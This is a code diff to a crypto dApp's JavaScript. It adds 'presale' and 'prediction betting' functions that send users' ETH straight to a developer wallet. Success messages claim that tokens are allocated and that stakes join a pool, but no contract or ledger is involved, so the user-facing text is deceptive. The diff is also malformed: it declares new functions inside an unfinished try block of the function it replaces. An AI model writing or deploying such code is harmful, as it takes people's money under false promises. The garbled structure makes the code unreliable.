@@ -495,29 +495,78 @@ async function executeMintPass() {
 
     try {
         const provider = new ethers.providers.Web3Provider(window.ethereum);
-        const signer = provider.getSigner();
-        
-        const tx = await signer.sendTransaction({
-            to: DEVELOPER_WALLET,
-            value: ethers.utils.parseEther(passCost)
+// ================= TRANSACTION ROUTERS (PURE WEB3 NATIVE DIRECT ROUTING) =================
+
+// 1. Pre-Listing Purchase Trigger (Direct Transfer via RPC window.ethereum)
+async function executePreListingBuy() {
+    if (!window.ethereum || !isConnected) return alert("Please connect your Web3 Wallet first!");
+    
+    const inputEl = document.getElementById("presale-eth-input");
+    const amountETH = inputEl ? inputEl.value : prompt("Enter amount of Base ETH to invest:", "0.005");
+    
+    if (!amountETH || isNaN(amountETH) || parseFloat(amountETH) <= 0) {
+        alert("Please enter a valid ETH amount!");
+        return;
+    }
+
+    const tokenAmount = (parseFloat(amountETH) * 1000000).toLocaleString();
+    const confirmProceed = confirm(`Confirm Action:\nYou will swap ${amountETH} ETH to secure ${tokenAmount} $FORECAST tokens.\n\nProceed to your Web3 wallet signature layer?`);
+    if (!confirmProceed) return;
+
+    try {
+        // Mengonversi ETH ke Wei (Hexadecimal) secara native tanpa ethers.js
+        const valueInWei = (parseFloat(amountETH) * 1e18).toString(16);
+        const hexValue = "0x" + valueInWei;
+
+        // Memicu pop-up transaksi transfer ETH biasa langsung ke wallet kamu
+        const txHash = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [{
+                from: userAddress,
+                to: DEVELOPER_WALLET,
+                value: hexValue,
+                // Gas otomatis dihitung oleh dompet (Base Network sangat murah)
+            }],
         });
         
-        alert(`👑 Premium Access Pass Activated!\nVIP parameters integrated. Welcome to the elite layer, Traveler.\n\nHash: ${tx.hash}`);
-        
-        // Automated Cosmetic Premium Upgrades
-        currentGlowColor = "rgba(245, 158, 11, 0.05)"; 
-        currentFrameColor = "#f59e0b"; // Automatically change UI Theme to Gold VIP
-        if (currentFateGlobal && userAddress) {
-            generateDestiny(userAddress);
-        }
-        
+        alert(`🚀 Presale Swap Secured!\nAllocation of ${tokenAmount} $FORECAST assigned to your node ledger.\n\nHash: ${txHash}`);
         if (typeof confetti === "function") confetti();
     } catch (err) {
-        console.error(err);
-        alert("Minting transaction sequence encountered a network error or rejection.");
+        console.error("Presale Error:", err);
+        alert("Transaction routing execution aborted or failed: " + (err.message || err));
     }
 }
 
+// 2. Micro-Betting Direct Routing Staker (Direct Transfer via RPC window.ethereum)
+async function executeBaseBet(option) {
+    if (!window.ethereum || !isConnected) return alert("Please connect your Web3 Wallet first!");
+    
+    const betAmount = "0.0002"; // 0.0002 ETH
+    const confirmBet = confirm(`Confirm Prediction Stake:\nDeploy ${betAmount} ETH supporting the [${option}] pool parameter?\n\nThis will be broadcasted directly into your secure ecosystem router.`);
+    if (!confirmBet) return;
+
+    try {
+        // Konversi 0.0002 ETH ke Wei Hex format -> 0x2c68af0bb14000
+        const valueInWei = (parseFloat(betAmount) * 1e18).toString(16);
+        const hexValue = "0x" + valueInWei;
+
+        // Kirim transaksi transfer biasa langsung memicu dompet
+        const txHash = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [{
+                from: userAddress,
+                to: DEVELOPER_WALLET,
+                value: hexValue,
+            }],
+        });
+        
+        alert(`🎰 Prediction Micro-Stake Active!\nDeposited ${betAmount} ETH to pool option: ${option}.\n\nTx Hash: ${txHash}`);
+        if (typeof confetti === "function") confetti();
+    } catch (err) {
+        console.error("Staking Error:", err);
+        alert("Staking sequence cancelled: " + (err.message || err));
+    }
+}
 // ==========================================
 // DESTINY ENGINE GENERATION & RENDERING
 // ==========================================
